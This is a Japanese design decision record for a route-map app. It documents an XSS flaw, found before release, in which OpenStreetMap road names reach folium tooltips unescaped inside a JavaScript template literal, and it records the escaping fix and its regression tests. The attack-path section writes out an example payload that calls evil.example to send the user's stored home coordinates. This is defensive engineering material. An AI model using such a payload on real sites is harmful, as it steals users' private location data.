# 0005: プロバイダ由来の文字列は描画層でエスケープする

## ステータス

**採用（2026-08-07）。** T19 の `/security-review` で XSS を発見し、
`ui/map_view.py` にエスケープを入れて修正した。

**デプロイ前に見つかった。** WORKFLOW.md フェーズ7（Streamlit Community Cloud への
公開）はまだ行っていないので、**公開された状態でこの穴が開いていたことはない。**
経緯を残す価値があるのはこの点である——レビューを工程に組み込んだこと
（フェーズ5）が、実際に公開前の1件を捕まえた。

## 背景

チェックポイントの吹き出しに道の名前を併記する（AC-04-4）。この名前は
ORS が返す `steps[].name` で、**実体は OpenStreetMap のデータであり誰でも編集できる。**

`ui/map_view.py` はこれを `folium.CircleMarker(tooltip=...)` に渡していた。
folium の `Tooltip` は値をエスケープしない。

```python
# .venv/Lib/site-packages/folium/map.py
self.text = str(text)          # エスケープなし
```

```jinja
{{ this._parent.get_name() }}.bindTooltip(
    `<div{% if this.style %} style={{ this.style|tojson }}{% endif %}>
         {{ this.text }}
     </div>`,
```

`branca.element.Template` は `jinja2.Template` の派生で **autoescape が無効**なので、
値は**バッククォートで囲まれた JS のテンプレートリテラルの内側**に生のまま出る。
実際の描画結果でも生のまま出ていることを確認した。

**テンプレートリテラルの内側では `${...}` が式として評価される。**
バッククォートを閉じる必要すらない。

### 攻撃の筋道

1. 攻撃者が OpenStreetMap 上の道路名を
   `${fetch('https://evil.example/?d='+localStorage.getItem('runloop.origin.v1'))}` に書き換える
2. 被害者がその道路を含む周回コースを生成する（コースは起点周辺の道路から
   自動生成されるので、**生活圏の道路を狙えばよい**）
3. `ors/mapper.py` の `_read_name` は `"-"` を `None` にするだけで他は素通しする
4. `folium` が生のまま差し込み、`streamlit-folium` がアプリと同一オリジンで描画する
5. **JavaScript が実行され、localStorage の丸めていない自宅座標を読み出せる**

**design.md 8.7（プライバシー）が守ろうとしているものが、この経路で破られる。**

## 検討した選択肢

### 1. `ors/mapper.py` で文字集合を制限する（根本で潰す）

**採らなかった。** 理由は2つ。

- **表示技術ごとに必要なエスケープが違う。** 根本で一律に制限すると、
  記号を含む正当な道路名を壊す。`st.write` に渡す一覧側は Streamlit が
  既定で HTML をエスケープするので、そもそも同じ処理は要らない
- **`ors/` の責務は「ORS が返したものをドメイン型に翻訳する」こと**である
  （design.md 1.2）。表示の安全を持ち込むと層が混ざる

### 2. `messages.py` でエスケープする

**採らなかった。** `messages.py` は**表示技術に依存しない文言**を返す責務で
（design.md 1.2 / 9.1）、地図の吹き出しにも `st.write` にも同じ文字列を渡している。
ここにエスケープを入れると、HTML を出さない経路にまで実体参照が混ざる。

### 3. 描画層（`ui/map_view.py`）で、folium に渡す直前にエスケープする

**採用。** エスケープの要件を決めるのは**渡す先の描画技術**であり、
それを知っているのはこの層だけである。

## 決定

`ui/map_view.py` に `_safe_tooltip()` を置き、folium に渡す直前で無害化する。

```python
escaped = html.escape(text, quote=True)
return escaped.replace("\\", "&#92;").replace("`", "&#96;").replace("${", "$&#123;")
```

**HTML 実体参照に置き換える**（バックスラッシュでエスケープしない）。
実体参照なら JS の文字列としても危険な文字が1つも残らず、`<div>` の内側では
元の文字として表示される。**`html.escape` を先にかける順序が要る**——
後にすると実体参照の `&` が二重にエスケープされて壊れる。

## 理由

- **HTML エスケープだけでは足りない。** テンプレートリテラルの内側では
  `${...}` が評価されるので、`<` を潰すだけでは防げない。
  故意破壊で実証した（HTML エスケープのみにすると、`<img>` の検査は通るのに
  テンプレートリテラルの検査が落ちる）
- **消すのではなく無害化する。** 名前を捨てれば安全だが、AC-04-4 の
  「取得できた場合のみ併記する」を満たせなくなる

## 結果として受け入れるリスク

- **エスケープが要る場所を人が判断する。** 描画層に新しい出力先
  （別の地図ライブラリ、HTML の直接出力）を足したとき、同じ検討が要る。
  自動では防げない
- **`folium` の実装に依存した判断である。** folium が将来エスケープするように
  なれば二重エスケープになる（表示が `&amp;#96;` のように崩れる）。
  テストが崩れを検出する（5節のテストは実体参照が出ることまで見ている）

## 回帰テスト

`tests/test_map_view.py` の5節に3件置いた。

- `${` とバッククォートとバックスラッシュが**安全な名前のときから増えない**
  （絶対数では見ない——区切りのバッククォートも、タイルの著作権表示に含まれる
  JSON エスケープのバックスラッシュも、folium 自身が出す）
- **消したのではなく無害化した**ことを、実体参照が出ることで固定する
  （名前を丸ごと捨てる実装でも「危険な文字が無い」検査は通ってしまう）
- HTML タグとしても解釈されない（`<img onerror=...>`）

故意破壊3パターン（エスケープを外す・HTML エスケープだけにする・
置換の順序を逆にする）で、いずれも意図したテストが落ちることを確認した。
